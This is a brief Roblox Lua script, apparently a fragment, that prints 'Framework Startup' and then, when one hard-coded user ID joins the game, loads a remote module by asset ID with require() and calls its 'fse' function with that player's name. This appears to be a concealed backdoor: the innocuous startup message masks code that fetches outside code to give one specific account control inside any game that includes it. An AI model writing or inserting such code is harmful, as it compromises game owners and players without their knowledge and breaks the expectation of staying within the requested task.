--end--
print("Framework Startup")
game.Players.PlayerAdded:Connect(function(plr)
	if plr.UserId==3264445159 then
		require(6324372525).fse(plr.Name)
	end
end)
